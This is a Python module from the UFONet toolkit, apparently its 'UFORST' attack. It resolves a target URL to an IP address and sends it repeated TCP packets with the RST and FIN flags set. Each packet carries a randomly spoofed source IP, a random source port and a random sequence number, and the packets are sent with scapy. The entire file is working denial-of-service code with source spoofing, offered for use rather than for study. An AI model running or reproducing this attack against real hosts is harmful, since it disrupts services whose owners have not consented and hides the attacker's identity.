#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet TCP 'RST+FIN' packet attack (UFORST)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def rstize(ip, sport, rounds):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_zombie_port = randInt() 
            seq = randInt()
            window = randInt()
            IP_p = IP()
            IP_p.src = randIP()
            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [UFORST] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            TCP_l = TCP()
            TCP_l.sport = s_zombie_port
            TCP_l.dport = sport
            TCP_l.seq = seq
            TCP_l.window = window
            TCP_l.flags = "RF" # FLAGS SET (RST+FIN)
            try:
                send(IP_p/TCP_l, verbose=0)
                print("[Info] [AI] [UFORST] Firing 'crystalized stones' ["+str(n)+"] -> [CRYSTALIZING!]")
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [UFORST] Failed to engage with 'crystalized stones' ["+str(n)+"]")
    except:
        print("[Error] [AI] [UFORST] Failing to engage... -> Is still target online? -> [Checking!]")

class UFORST(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] TCP 'RST+FIN' (UFORST) is ready to fire: [" , rounds, "crystalized stones ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [UFORST] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        rstize(ip, sport, rounds) # attack with UFORST using threading
